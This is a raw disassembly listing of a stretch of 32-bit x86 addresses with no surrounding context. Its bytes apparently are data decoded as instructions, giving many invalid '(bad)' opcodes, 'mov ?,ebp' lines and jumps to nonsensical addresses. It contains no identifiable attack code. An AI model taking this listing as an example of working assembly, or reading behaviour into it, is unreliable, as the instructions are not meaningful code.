  4142b6:	std    
  4142b7:	std    
  4142b8:	mov    ?,ebp
  4142ba:	mov    ss,WORD PTR [edx-0x26d0272]
  4142c0:	mov    ss,WORD PTR [edx-0x2027172]
  4142c6:	xchg   edx,eax
  4142c7:	xchg   edx,eax
  4142c8:	xchg   edx,eax
  4142c9:	std    
  4142ca:	std    
  4142cb:	std    
  4142cc:	mov    ?,ebp
  4142ce:	mov    ?,ebp
  4142d0:	xchg   edx,eax
  4142d1:	mov    ss,WORD PTR [edx-0x2717103]
  4142d7:	mov    ?,ebp
  4142d9:	mov    ?,ebp
  4142db:	mov    ?,ebp
  4142dd:	xchg   edx,eax
  4142de:	mov    ?,ebp
  4142e0:	mov    ss,WORD PTR [edx-0x6502026e]
  4142e6:	jb     0x414356
  4142e8:	outs   dx,BYTE PTR ds:[esi]
  4142e9:	add    BYTE PTR [edx+0x6967627b],0x5c
  4142f0:	add    eax,0xe0
  4142f5:	pop    eax
  4142f6:	mov    esp,edx
  4142f8:	fsubr  st(2),st
  4142fa:	xchg   BYTE PTR [edi+0x71],ch
  4142fd:	and    al,0x4f
  4142ff:	push   ebp
  414300:	dec    ebp
  414301:	mov    bl,BYTE PTR [edi-0x7b]
  414304:	ffreep st(5)
  414306:	in     eax,0xd3
  414308:	jmp    0x8b3138ec
  41430d:	mov    ebp,0x7413776e
  414312:	std    
  414313:	std    
  414314:	std    
  414315:	cmp    ebp,0x92fdfd92
  41431b:	mov    ?,ebp
  41431d:	mov    cs,WORD PTR [esi-0x6d6d6d03]
  414323:	std    
  414324:	std    
  414325:	std    
  414326:	mov    ss,WORD PTR [edx-0x716d6d03]
  41432c:	mov    ?,ebp
  41432e:	mov    ss,WORD PTR [edx-0x271026e]
  414334:	xchg   edx,eax
  414335:	std    
  414336:	mov    ?,ebp
  414338:	mov    ss,WORD PTR [edx-0x6d027103]
  41433e:	xchg   edx,eax
  41433f:	std    
  414340:	mov    ?,ebp
  414342:	jb     0x4143b2
  414344:	outs   dx,BYTE PTR ds:[esi]
  414345:	outs   dx,BYTE PTR ds:[esi]
  414346:	jnp    0x4143c3
  414348:	add    DWORD PTR fs:[edi+0xb3b680],eax
  41434f:	add    BYTE PTR [eax],al
  414351:	push   ebx
  414352:	mov    al,BYTE PTR [esi-0x60120a28]
  414358:	jp     0x4143d6
  41435a:	cmp    al,0x4f
  41435c:	dec    ecx
  41435d:	test   DWORD PTR [edi+ebx*4-0x1b],ebp
  414361:	jmp    0xd4151741
  414366:	jmp    0x2bbacc65
  41436b:	push   ebp
  41436c:	push   ebp
  41436d:	and    eax,0x1734526
  414372:	add    DWORD PTR [edx-0x6d6d026e],edx
  414378:	mov    ?,ebp
  41437a:	std    
  41437b:	mov    cs,WORD PTR [esi-0x6d027103]
  414381:	xchg   edx,eax
  414382:	std    
  414383:	xchg   edx,eax
  414384:	xchg   edx,eax
  414385:	xchg   edx,eax
  414386:	std    
  414387:	std    
  414388:	std    
  414389:	mov    ?,ebp
  41438b:	xchg   edx,eax
  41438c:	xchg   edx,eax
  41438d:	std    
  41438e:	mov    ?,ebp
  414390:	mov    ?,ebp
  414392:	mov    ss,WORD PTR [edx-0x2027103]
  414398:	xchg   edx,eax
  414399:	std    
  41439a:	mov    ss,WORD PTR [edx+0x6e7692fd]
  4143a0:	jnp    0x41441d
  4143a2:	jnp    0x41441a
  4143a4:	jle    0x4143a6
  4143a6:	add    eax,0xfd
  4143ab:	pop    eax
  4143ac:	test   BYTE PTR [edx-0x3e],bh
  4143af:	fild   DWORD PTR [edx]
  4143b1:	fldenv [ebx+eiz*2-0x7ac8c3c9]
  4143b8:	pusha  
  4143b9:	rcl    ebx,1
  4143bb:	repnz rcr ebx,cl
  4143be:	aam    0xd2
  4143c0:	enter  0x65b1,0x8a
  4143c4:	dec    edi
  4143c5:	dec    ebp
  4143c6:	push   esi
  4143c7:	cs das 
  4143c9:	cs xor al,0x45
  4143cc:	jae    0x4143cb
  4143ce:	std    
  4143cf:	xchg   edx,eax
  4143d0:	xchg   edx,eax
  4143d1:	std    
  4143d2:	xchg   edx,eax
  4143d3:	xchg   edx,eax
  4143d4:	mov    ss,WORD PTR [edx-0x6d026d03]
  4143da:	std    
  4143db:	xchg   edx,eax
  4143dc:	xchg   edx,eax
  4143dd:	std    
  4143de:	xchg   edx,eax
  4143df:	xchg   edx,eax
  4143e0:	mov    cs,WORD PTR [esi-0x26d026e]
  4143e6:	mov    ?,ebp
  4143e8:	std    
  4143e9:	mov    ?,ebp
  4143eb:	mov    ?,ebp
  4143ed:	xchg   edx,eax
  4143ee:	xchg   edx,eax
  4143ef:	std    
  4143f0:	mov    cs,WORD PTR [esi-0x271026e]
  4143f6:	std    
  4143f7:	mov    ?,WORD PTR [esi-0x7e]
  4143fa:	jnp    0x414477
  4143fc:	jnp    0x41446d
  4143fe:	cmp    ebp,0x8e92928e
  414404:	add    BYTE PTR [eax],al
  414406:	add    BYTE PTR [ebp+0x64],cl
  414409:	jae    0x414488
  41440b:	mov    ebx,0x8406e5db
  414410:	jo     0x414467
  414412:	jl     0x414399
  414414:	ins    BYTE PTR es:[edi],dx
  414415:	rcl    bl,0xdb
  414418:	fcmovnbe st,st(2)
  41441a:	fcmovnbe st,st(4)
  41441c:	retf   
  41441d:	lea    eax,[ecx+0x2e566e6c]
  414423:	push   esi
  414424:	das    
  414425:	cmp    edi,DWORD PTR [ebx]
  414427:	and    esi,DWORD PTR [ebx]
  414429:	inc    ebp
  41442a:	mov    DWORD PTR [ecx],eax
  41442c:	xchg   edx,eax
  41442d:	mov    ?,ebp
  41442f:	xchg   edx,eax
  414430:	xchg   edx,eax
  414431:	std    
  414432:	xchg   edx,eax
  414433:	xchg   edx,eax
  414434:	std    
  414435:	std    
  414436:	mov    ss,WORD PTR [edx-0x26d716e]
  41443c:	xchg   edx,eax
  41443d:	std    
  41443e:	mov    ?,ebp
  414440:	mov    cs,WORD PTR [esi-0x2717103]
  414446:	mov    ss,WORD PTR [edx-0x2716d6e]
  41444c:	xchg   edx,eax
  41444d:	std    
  41444e:	mov    ss,WORD PTR [edx-0x26d6d03]
  414454:	outs   dx,DWORD PTR ds:[esi]
  414455:	add    BYTE PTR [ebx+edi*2],al
  414458:	add    BYTE PTR [edi],al
  41445a:	jo     0x41445d
  41445c:	xchg   edx,eax
  41445d:	std    
  41445e:	xchg   edx,eax
  41445f:	std    
  414460:	std    
  414461:	add    BYTE PTR [eax],al
  414463:	add    BYTE PTR [eax],al
  414465:	add    BYTE PTR cs:[eax-0x19f46980],0xdc
  41446d:	out    dx,eax
  41446e:	test   BYTE PTR [esi],ah
  414470:	push   eax
  414471:	pop    edi
  414472:	test   al,0xf7
  414474:	jmp    0xd636206b
  414479:	ror    ch,cl
  41447b:	mov    DWORD PTR [edi+0x562f4d44],eax
  414481:	cs push esi
  414483:	cmp    esp,DWORD PTR [ebx]
  414485:	dec    esi
  414486:	and    BYTE PTR ds:0x929a6c50,bl
  41448c:	cmp    ebp,0x1fd0101
  414492:	add    DWORD PTR [ecx],eax
  414494:	push   es
  414495:	std    
  414496:	add    BYTE PTR [ecx],dl
  414498:	xchg   edx,eax
  414499:	std    
  41449a:	std    
  41449b:	xchg   edx,eax
  41449c:	std    
  41449d:	std    
  41449e:	xchg   edx,eax
  41449f:	std    
  4144a0:	mov    ?,ebp
  4144a2:	mov    ?,ebp
  4144a4:	mov    ?,ebp
  4144a6:	std    
  4144a7:	mov    ?,ebp
  4144a9:	add    BYTE PTR [esi],al
  4144ab:	xchg   edx,eax
  4144ac:	add    ebp,edi
  4144ae:	add    DWORD PTR [edi+0x4],ebp
  4144b1:	jnp    0x4144b3
  4144b3:	pop    es
  4144b4:	arpl   WORD PTR [ecx],ax
  4144b6:	std    
  4144b7:	cmp    ebp,0xfe81
  4144bd:	add    BYTE PTR [eax],al
  4144bf:	sub    BYTE PTR [ebx+0x60],dh
  4144c2:	jp     0x41444e
  4144c4:	mov    bh,cl
  4144c6:	fucomp st(4)
  4144c8:	rol    DWORD PTR [ebp-0x2443937c],0xf2
  4144cf:	fcmovnbe st,st(4)
  4144d1:	aam    0xd4
  4144d3:	rcl    al,cl
  4144d5:	mov    DWORD PTR [edi+0x2f5d2e38],eax
  4144db:	pop    ebp
  4144dc:	das    
  4144dd:	pop    ebp
  4144de:	and    esp,DWORD PTR [eax]
  4144e0:	xor    eax,0x65703838
  4144e5:	call   0x9601:0xb404abab
  4144ec:	add    eax,0xa70600ae
  4144f1:	test   eax,0x928e9afe
  4144f6:	add    eax,0x8e1b00fd
  4144fb:	std    
  4144fc:	xchg   edx,eax
  4144fd:	std    
  4144fe:	xchg   edx,eax
  4144ff:	mov    ?,ebp
  414501:	mov    ss,WORD PTR [edx-0x26d0203]
  414507:	xchg   edx,eax
  414508:	std    
  414509:	outs   dx,DWORD PTR ds:[esi]
  41450a:	jnp    0x414587
  41450c:	jne    0x414589
  41450e:	arpl   WORD PTR [ecx],ax
  414510:	(bad)  
  414511:	dec    BYTE PTR [ecx+0x738d]
  414517:	add    BYTE PTR [eax],al
  414519:	pop    eax
  41451a:	test   BYTE PTR [edx-0x10757c7d],cl
  414520:	pop    es
  414521:	fucom  st(1)
  414523:	nop
  414524:	ins    BYTE PTR es:[edi],dx
  414525:	fs mov esp,0xd4dbd5d3
  41452b:	aam    0xc3
  41452d:	aam    0xbb
  41452f:	xchg   DWORD PTR [esi+0x50],edi
  414532:	pop    ebp
  414533:	das    
  414534:	cmp    ebp,DWORD PTR [edi]
  414536:	cs pop ebp
  414538:	cmp    BYTE PTR [eax+0x7e],ah
  41453b:	cmp    ebp,0xb4fcfd92
  414541:	ror    edx,1
  414543:	retf   0xc8ca
  414546:	fld    st(7)
  414548:	(bad)  
  414549:	retf   
  41454a:	(bad)  
  41454b:	retf   
  41454c:	retf   
  41454d:	mov    edx,0xd0cdb5ba
  414552:	mov    ebx,0xa7aeb1b6
  414557:	test   eax,0x1fdfd9a
  41455c:	add    DWORD PTR [ecx],eax
  41455e:	std    
  41455f:	xchg   edx,eax
  414560:	xchg   edx,eax
  414561:	std    
  414562:	xchg   edx,eax
  414563:	xchg   edx,eax
  414564:	std    
  414565:	add    DWORD PTR [eax+0x7b],esi
  414568:	jnp    0x4145e5
  41456a:	cmp    BYTE PTR [edx-0x7f],0x80
  41456e:	test   al,0x6c
  414570:	jp     0x4144f7
  414572:	add    BYTE PTR [eax],al
  414574:	add    BYTE PTR [eax-0x7d],bl
  414577:	or     DWORD PTR [edx+0x798a838a],0x8
  41457e:	ffreep st(0)
  414580:	jae    0x4145ff
  414582:	ret    0xf4d4
  414585:	aam    0xc4
  414587:	ret    
  414588:	ret    
  414589:	hlt    
  41458a:	mov    esp,0x2e43738e
  41458f:	das    
  414590:	xor    al,0x3f
  414592:	inc    ebp
  414593:	je     0x414523
  414595:	std    
  414596:	add    DWORD PTR [edx-0x7171716e],edx
  41459c:	cmp    esi,0xc7dad1b4
  4145a2:	mov    dh,0xf6
  4145a5:	mov    bh,0xc4
  4145a8:	mov    esi,0xc6bfcbc6
  4145ae:	(bad)  
  4145af:	retf   
  4145b0:	mov    dh,0xb9
  4145b3:	mov    edx,0x888a76bd
  4145b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145b9:	test   al,0x8d
  4145bb:	call   0x101:0x1fd8e8e
  4145c2:	jo     0x41463f
  4145c4:	jnp    0x414548
  4145c6:	imul   eax,DWORD PTR [esp+ebp*2-0x7a7b7b7b],0xffffff85
  4145ce:	add    BYTE PTR [eax],al
  4145d0:	add    BYTE PTR [esi],dh
  4145d2:	in     al,0xef
  4145d4:	mov    ebp,0x746c858a
  4145d9:	adc    BYTE PTR [esi-0x2f73be4f],0xd4
  4145e0:	aam    0xc3
  4145e2:	out    0xc3,eax
  4145e4:	ret    
  4145e5:	mov    edi,0x357381ab
  4145ea:	inc    eax
  4145eb:	pop    edi
  4145ec:	pusha  
  4145ed:	jg     0x4145ec
  4145ef:	dec    BYTE PTR [ecx-0x27e6557]
  4145f5:	std    
  4145f6:	mov    es,WORD PTR [ecx-0x4e657172]
  4145fc:	sar    BYTE PTR [ecx-0x34363437],1
  414602:	mov    ecx,0xbfc6bfcb
  414607:	retf   
  414608:	add    eax,0xe01d00c6
  41460d:	(bad)  
  41460e:	mov    edi,0x776e8299
  414613:	ja     0x414683
  414615:	jno    0x414692
  414617:	jbe    0x41468f
  414619:	mov    dh,BYTE PTR [eax-0x7b]
  41461c:	jp     0x414694
  41461e:	outs   dx,BYTE PTR ds:[esi]
  41461f:	outs   dx,BYTE PTR ds:[esi]
  414620:	ja     0x414675
  414622:	jns    0x4145a8
  414624:	xchg   BYTE PTR [ebp+eax*4+0x7a85],al
  41462b:	add    BYTE PTR [eax],al
  41462d:	push   cs
  41462e:	(bad)  
  414630:	cmc    
  414631:	sar    DWORD PTR [ebx-0x27e7859],0x81
  414638:	sbb    DWORD PTR [edx-0x3cfb2b46],0xd0d44600
  414642:	cld    
  414643:	std    
  414644:	xchg   esi,edi
  414646:	std    
  414647:	add    DWORD PTR [ecx],eax
  414649:	std    
  41464a:	mov    cs,WORD PTR [esi+edi*8-0x4e587174]
  414651:	shl    BYTE PTR [edx-0x1f4a4d4e],1
  414657:	(bad)  
  414658:	aam    0xbf
  41465a:	mov    edx,0xb9bab9ba
  41465f:	mov    ecx,0xc9afb9c9
  414664:	mov    dh,0xea
  414667:	(bad)  
  414668:	retf   
  414669:	idiv   BYTE PTR [edi+0x6e8212b8]
  41466f:	imul   ebp,DWORD PTR [ebx+0x6b],0xffffff82
  414673:	add    BYTE PTR [edx-0x7d7d7d92],0x6e
  41467a:	outs   dx,BYTE PTR ds:[esi]
  41467b:	outs   dx,BYTE PTR ds:[esi]
  41467c:	ja     0x4146f5
  41467e:	imul   eax,DWORD PTR [ebx-0x7a7a7bbc],0xffffff85
  414685:	jp     0x414687
  414687:	add    BYTE PTR [eax],al
  414689:	inc    ebp
  41468a:	cmc    
  41468b:	out    0xdb,al
  41468d:	aam    0xc3
  41468f:	mov    edi,0xa7b1b3b5
  414694:	std    
  414695:	test   eax,0xc3d4c3cb
  41469a:	ret    
  41469b:	(bad)  
  41469c:	aam    0xb6
  41469e:	std    
  41469f:	xchg   edx,eax
  4146a0:	std    
  4146a1:	add    DWORD PTR [edx-0x716d716e],edx
  4146a7:	std    
  4146a8:	xchg   DWORD PTR [ecx-0x3c3c4730],esi
  4146ae:	aam    0xc3
  4146b0:	aam    0xe7
  4146b2:	ret    
  4146b3:	aam    0xc4
  4146b5:	add    eax,0xb9bab9ba
  4146ba:	mov    ecx,0xb9b9bab9
  4146bf:	mov    ecx,0xc7c7c7bf
  4146c4:	mov    bh,0xbf
  4146c6:	mov    edi,0x6e827205
  4146cb:	ja     0x41473b
  4146cd:	add    BYTE PTR [edx+0x6e0600],0xd
  4146d4:	ja     0x414741
  4146d6:	ja     0x41474f
  4146d8:	ja     0x414748
  4146da:	inc    ebp
  4146db:	inc    esp
  4146dc:	test   BYTE PTR [ebp+0x7a6c85],al
  4146e2:	add    BYTE PTR [eax],al
  4146e4:	add    ebp,esp
  4146e6:	add    ebp,edx
  4146e8:	add    al,0xc3
  4146ea:	add    BYTE PTR [ebp-0x2c],al
  4146ed:	aam    0xc3
  4146ef:	(bad)  
  4146f0:	mov    ch,0xb2
  4146f2:	jmp    0xc3d6:0xc3c3c3d4
  4146f9:	mov    cl,0x81
  4146fb:	std    
  4146fc:	or     DWORD PTR [esi-0x7efe0266],0xd6b5b1fc
  414706:	aam    0xc3
  414708:	ret    
  414709:	ret    
  41470a:	(bad)  
  41470b:	ret    
  41470c:	(bad)
  414710:	mov    cl,0xb3
  414712:	add    eax,0xadb9baad
  414717:	mov    ecx,0xb9bab9ba
  41471c:	mov    bh,0xc7
  41471f:	mov    esi,0x7cb9c6c6
  414725:	xor    BYTE PTR [edi+0x77],0x82
  414729:	outs   dx,BYTE PTR ds:[esi]
  41472a:	outs   dx,BYTE PTR ds:[esi]
  41472b:	outs   dx,BYTE PTR ds:[esi]
  41472c:	ja     0x41479c
  41472e:	ja     0x41479e
  414730:	ja     0x414732
  414732:	add    al,0x6b
  414734:	add    BYTE PTR [ebx],al
  414736:	ja     0x4147a6
  414738:	test   BYTE PTR [eax],al
  41473a:	add    al,0x85
  41473c:	add    DWORD PTR [edx+0x1],edi
  41473f:	ins    BYTE PTR es:[edi],dx
  414740:	add    BYTE PTR [eax],al
  414742:	add    BYTE PTR [esp+esi*8],al
  414745:	aam    0xc4
  414747:	out    0x6,eax
  414749:	ret    
  41474a:	add    BYTE PTR ds:0xc3c4d4d4,dh
  414750:	aam    0xc3
  414752:	(bad)
  414756:	adc    DWORD PTR [edx-0x516d716e],0xb005b3b6
  414760:	ret    
  414761:	out    0xc4,eax
  414763:	fidiv  DWORD PTR [ebx-0x4e514e4f]
  414769:	scas   al,BYTE PTR es:[edi]
  41476a:	call   0xb9b9:0xb9b2746d
  414771:	mov    edx,0xb9b9bab9
  414776:	mov    ecx,0xebc7c6cb
  41477b:	(bad)  
  41477c:	mov    bh,0xc6
  41477e:	leave  
  41477f:	retf   
  414780:	jl     0x414782
  414782:	push   es
  414783:	outs   dx,BYTE PTR ds:[esi]
  414784:	add    BYTE PTR [edi+esi*2],cl
  414787:	outs   dx,BYTE PTR ds:[esi]
  414788:	ja     0x4147f8
  41478a:	ja     0x414803
  41478c:	imul   ebp,DWORD PTR [ebx+0x6b],0x77
  414790:	ja     0x414803
  414792:	add    al,0x85
  414794:	add    edi,DWORD PTR [edx+0x0]
  414797:	add    BYTE PTR ds:0xd44e00c3,al
  41479d:	ret    
  41479e:	aam    0xc3
  4147a0:	aam    0xc4
  4147a2:	aam    0xd4
  4147a4:	ret    
  4147a5:	aad    0xc3
  4147a7:	ret    
  4147a8:	ret    
  4147a9:	lods   eax,DWORD PTR ds:[esi]
  4147aa:	mov    WORD PTR [ecx],es
  4147ac:	std    
  4147ad:	std    
  4147ae:	sub    DWORD PTR [esi-0x3c3c414e],0xb6b5b0c3
  4147b8:	call   0x5f60:0x5f647d81
  4147bf:	inc    esp
  4147c0:	sub    al,0x11
  4147c2:	mov    ecx,0xc6bfb9ba
  4147c7:	leave  
  4147c8:	leave  
  4147c9:	leave  
  4147ca:	mov    ecx,0xc7c7bfc9
  4147cf:	jmp    0x414798
  4147d1:	(bad)  
  4147d2:	retf   
  4147d3:	neg    cl
  4147d5:	jno    0x414845
  4147d7:	ja     0x414844
  4147d9:	imul   esi,DWORD PTR [edi+0x6b],0x6b
  4147dd:	imul   ebp,DWORD PTR [esi+0x77],0x6b
  4147e1:	outs   dx,BYTE PTR ds:[esi]
  4147e2:	ja     0x414852
  4147e4:	ja     0x414854
  4147e6:	ja     0x414860
  4147e8:	jp     0x41476f
  4147ea:	add    eax,0x400007a
  4147ef:	ret    
  4147f0:	add    BYTE PTR [eax-0x2c],al
  4147f3:	aam    0xf4
  4147f5:	aam    0xd5
  4147f7:	aam    0xc3
  4147f9:	ret    
  4147fa:	ret    
  4147fb:	aam    0xd5
  4147fd:	aam    0xc3
  4147ff:	ret    
  414800:	retf   
  414801:	mov    cl,0xa9
  414803:	mov    ?,ebp
  414805:	std    
  414806:	xchg   edx,eax
  414807:	call   0xfcb4:0xb3b5b3ae
  41480e:	push   edi
  41480f:	arpl   WORD PTR [ebx+esi*1],bp
  414812:	xor    al,0x3b
  414814:	cmp    esi,DWORD PTR [edi+ebp*1]
  414817:	cmp    eax,ecx
  414819:	mov    edx,0xd7d7d7cb
  41481e:	mov    esi,0xc6cbc6c6
  414824:	(bad)  
  414825:	xlat   BYTE PTR ds:[ebx]
  414826:	xlat   BYTE PTR ds:[ebx]
  414827:	jmp    0x4147f0
  414829:	(bad)  
  41482a:	retf   
  41482b:	shl    BYTE PTR [ecx+0x77],0x6b
  41482f:	imul   esi,DWORD PTR [edi+0x6b],0xc
  414833:	ja     0x414835
  414835:	or     BYTE PTR [ecx+0x7a],bh
  414838:	test   DWORD PTR [ebp+0x7a7a6c7a],eax
  41483e:	add    BYTE PTR [eax],al
  414840:	add    BYTE PTR ds:0xf2f3d4e7,al
  414846:	jmp    0x1144c4b
  41484b:	add    eax,0xd4c3d4d5
  414850:	aam    0x0
  414852:	add    eax,0xd63400c3
  414857:	loopne 0x41480e
  414859:	mov    ebx,0x1fd92ae
  41485e:	std    
  41485f:	call   0x2020:0x354481fd
  414866:	dec    esi
  414867:	and    ebx,DWORD PTR [ebp+0x3b]
  41486a:	and    edi,DWORD PTR [ebx]
  41486c:	sbb    bl,dl
  41486e:	xlat   BYTE PTR ds:[ebx]
  41486f:	jmp    0xd80a273e
  414874:	mov    bh,0xeb
  414876:	xlat   BYTE PTR ds:[ebx]
  414877:	jmp    0x414840
  414879:	xlat   BYTE PTR ds:[ebx]
  41487a:	xlat   BYTE PTR ds:[ebx]
  41487b:	enter  0xb7e8,0xd5
  41487f:	(bad)  
  414880:	into   
  414881:	ja     0x4148ee
  414883:	jno    0x4148f6
  414885:	jb     0x4148f9
  414887:	js     0x414814
  414889:	mov    al,BYTE PTR [esi]
  41488b:	add    DWORD PTR [eax],0xb
  41488e:	jns    0x414902
  414890:	jno    0x41481a
  414892:	jp     0x414819
  414894:	jp     0x414910
  414896:	test   DWORD PTR [edx+0x7a],edi
  414899:	add    BYTE PTR [eax],al
  41489b:	add    BYTE PTR [eax],al
  41489d:	or     edx,eax
  41489f:	stos   BYTE PTR es:[edi],al
  4148a0:	in     eax,dx
  4148a1:	(bad)  
  4148a3:	cmc    
  4148a4:	out    0xc5,al
  4148a6:	fcomi  st,st(4)
  4148a8:	mov    esi,0xc30500
  4148ad:	dec    eax
  4148ae:	(bad)
  4148b2:	ret    
  4148b3:	aam    0xc3
  4148b5:	(bad)  
  4148b6:	mov    ch,0xb3
  4148b8:	scas   al,BYTE PTR es:[edi]
  4148b9:	std    
  4148ba:	add    ebp,edi
  4148bc:	or     DWORD PTR [ebx+esi*2+0x23202c63],0x23233b3b
  4148c7:	adc    ecx,eax
  4148c9:	fmulp  st(2),st
  4148cb:	jmp    0xc809319a
  4148d0:	(bad)  
  4148d1:	xlat   BYTE PTR ds:[ebx]
  4148d2:	xlat   BYTE PTR ds:[ebx]
  4148d3:	xlat   BYTE PTR ds:[ebx]
  4148d4:	jmp    0x4148ad
  4148d6:	(bad)
  4148d9:	fxch   st(5)
  4148db:	add    DWORD PTR [esp+ebp*2+0x7f418973],0xffffff80
  4148e3:	xor    BYTE PTR [ebx-0x80],0x65
  4148e7:	add    BYTE PTR [eax+0x418e817f],0x74
  4148ee:	test   BYTE PTR [ebp+0x7a7a8585],al
  4148f4:	jp     0x414970
  4148f6:	add    BYTE PTR [eax],al
  4148f8:	add    BYTE PTR [ecx],cl
  4148fa:	mov    cl,BYTE PTR [edx-0x553e4275]
  414900:	jmp    0x4421dd7
  414905:	ret    
  414906:	add    esp,edx
  414908:	add    eax,0xbe4500c3
  41490d:	ret    
  41490e:	(bad)  
  41490f:	ret    
  414910:	ret    
  414911:	ret    
  414912:	aam    0xd6
  414914:	or     eax,0xfd019ab1
  414919:	add    DWORD PTR [ecx],eax
  41491b:	xchg   DWORD PTR [eax+0x38],esp
  41491e:	cmp    ebp,DWORD PTR [edi]
  414920:	cmp    edi,DWORD PTR [ebx]
  414922:	adc    edx,ecx
  414924:	push   es
  414925:	jmp    0xc70932f4
  41492a:	mov    dh,0xc7
  41492d:	mov    bh,0xc6
  414930:	fcmovbe st,st(0)
  414932:	mov    dh,0xb4
  414934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414936:	xchg   ebp,edi
  414938:	std    
  414939:	mov    cs,WORD PTR [esi-0x7f7f7379]
  41493f:	jae    0x4149b5
  414941:	jae    0x4149a8
  414943:	jae    0x4149b8
  414945:	inc    ecx
  414946:	mov    esi,?
  414948:	jg     0x4149c4
  41494a:	test   DWORD PTR [edx-0x5c],edi
  41494d:	jp     0x4149bb
  41494f:	jp     0x4149cb
  414951:	add    BYTE PTR [eax],al
  414953:	add    BYTE PTR [eax],al
  414955:	sbb    BYTE PTR [edx+0x7a888a88],cl
  41495b:	ins    BYTE PTR es:[edi],dx
  41495c:	xchg   esi,eax
  41495d:	mov    bl,0xb5
  41495f:	mov    bl,0xd6
  414962:	out    0xd5,eax
  414964:	ret    
  414965:	ret    
  414966:	mov    esi,0xd6d6c3d6
  41496b:	ret    
  41496c:	ret    
  41496d:	les    eax,FWORD PTR ds:0xba3b00c3
  414973:	mov    dh,0x9a
  414975:	std    
  414976:	std    
  414977:	xchg   edx,eax
  414978:	xchg   edx,eax
  414979:	xchg   DWORD PTR [eax+edx*2+0x2e],ebp
  41497d:	push   0xffffffee
  41497f:	retf   0xc8c8
  414982:	fmulp  st(0),st
  414984:	idiv   BYTE PTR [edi-0x32463437]
  41498a:	mov    ebx,0x7e7e80b4
  41498f:	xchg   DWORD PTR [esp+ecx*4-0x7878be74],ecx
  414996:	xchg   esi,edi
  414998:	inc    ecx
  414999:	mov    DWORD PTR [eax+0x73747373],eax
  41499f:	jae    0x414a14
  4149a1:	mov    WORD PTR [ecx+eax*2+0x7a7a7a7f],cs
  4149a8:	ins    BYTE PTR es:[edi],dx
  4149a9:	jp     0x414a25
  4149ab:	jp     0x414a21
  4149ad:	add    BYTE PTR [eax],al
  4149af:	add    BYTE PTR [eax],al
  4149b1:	ds out dx,eax
  4149b3:	cdq    
  4149b4:	cli    
  4149b5:	lahf   
  4149b6:	xchg   esi,eax
  4149b7:	jle    0x414940
  4149b9:	adc    DWORD PTR [edx-0x3c2b4d57],0xc3c3d4d5
  4149c3:	ret    
  4149c4:	(bad)  
  4149c5:	ret    
  4149c6:	ret    
  4149c7:	(bad)  
  4149c8:	ret    
  4149c9:	ret    
  4149ca:	ret    
  4149cb:	(bad)  
  4149cc:	ret    
  4149cd:	ret    
  4149ce:	(bad)  
  4149cf:	mov    esi,0xb1b3bac3
  4149d4:	xchg   edx,eax
  4149d5:	add    DWORD PTR [ecx],eax
  4149d7:	std    
  4149d8:	jg     0x414a1f
  4149da:	adc    al,0xed
  4149dc:	vpsubsw ymm0,ymm7,ymm5
  4149e0:	xlat   BYTE PTR ds:[ebx]
  4149e1:	mov    ecx,0x9fc2d0cd
  4149e6:	test   al,0x73
  4149e8:	cmp    BYTE PTR [edi+0x7e],0x89
  4149ec:	jle    0x41497a
  4149ee:	jle    0x414a5d
  4149f0:	add    eax,0x8c150087
  4149f5:	mov    DWORD PTR [eax+0x73737473],eax
  4149fb:	xor    BYTE PTR [ebx+0x7e],0x8c
  4149ff:	mov    WORD PTR [edi+0x7a],?
  414a02:	jp     0x414a70
  414a04:	jp     0x41498b
  414a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a07:	je     0x414a07
  414a09:	add    BYTE PTR [eax],al
  414a0b:	add    BYTE PTR [eax],al
  414a0d:	sbb    esp,ebx
  414a0f:	out    0xe5,al
  414a11:	or     eax,0xfd818ea7
  414a16:	adc    DWORD PTR [edx-0x3c2b0b4e],0xc3c3e7c4
  414a20:	ret    
  414a21:	mov    esi,0xc3b0c3d6
  414a26:	mov    esi,0xc30400
  414a2b:	and    al,0xd6
  414a2d:	mov    esi,0xbab0c3c3
  414a32:	mov    bl,0xa7
  414a34:	add    DWORD PTR [ecx],0xc8dffafc
  414a3a:	rol    al,0xd1
  414a3d:	ret    0x449f
  414a40:	test   DWORD PTR [ebp-0x7f8c9f7b],eax
  414a46:	jg     0x4149d1
  414a48:	mov    DWORD PTR [esi-0x77],edi
  414a4b:	inc    ecx
  414a4c:	mov    WORD PTR [ecx+0x41],es
  414a4f:	xchg   DWORD PTR [esp+ecx*4],eax
  414a52:	add    BYTE PTR [ebx],dl
  414a54:	jg     0x414ac9
  414a56:	xor    BYTE PTR [ebx-0x80],0x73
  414a5a:	jae    0x4149e5
  414a5c:	mov    WORD PTR [ecx+0x7f],es
  414a5f:	ins    BYTE PTR es:[edi],dx
  414a60:	jp     0x414adc
  414a62:	test   DWORD PTR [eax+eax*4-0x7f],ebp
  414a66:	xchg   edx,eax
  414a67:	add    BYTE PTR [eax],al
  414a69:	add    BYTE PTR [eax],al
  414a6b:	or     esp,esi
  414a6d:	shl    BYTE PTR [esi-0x71717174],0x92
  414a74:	std    
  414a75:	test   eax,0xc3040005
  414a7a:	add    BYTE PTR [ecx-0x42],cl
  414a7d:	(bad)  
  414a7e:	mov    edx,0xc3c3b0bf
  414a83:	aam    0xc3
  414a85:	ret    
  414a86:	ret    
  414a87:	(bad)  
  414a88:	ret    
  414a89:	ret    
  414a8a:	mov    al,0xc3
  414a8c:	mov    al,0xd6
  414a8e:	(bad)  
  414a8f:	(bad)  
  414a90:	lods   al,BYTE PTR ds:[esi]
  414a91:	div    BYTE PTR [ebx-0x3e056559]
  414a97:	lahf   
  414a98:	test   BYTE PTR [ebp-0x7b7b7a7c],al
  414a9e:	test   BYTE PTR [ebp-0x7f8c9b94],al
  414aa4:	jg     0x414b25
  414aa6:	jle    0x414a31
  414aa8:	jle    0x414b28
  414aaa:	inc    ecx
  414aab:	mov    WORD PTR [esp+ecx*4-0x78737382],cs
  414ab2:	jle    0x414b33
  414ab4:	add    BYTE PTR [eax+0x7e737f80],0x8c
  414abb:	mov    DWORD PTR [eax+0x607a857a],eax
  414ac1:	mov    DWORD PTR [ecx],eax
  414ac3:	std    
  414ac4:	xchg   edx,eax
  414ac5:	add    BYTE PTR [eax],al
  414ac7:	add    BYTE PTR [eax],al
  414ac9:	pop    ss
  414aca:	mov    cl,0xa9
  414acc:	or     DWORD PTR [esi-0x6d026d03],0xc3c4aefd
  414ad6:	(bad)
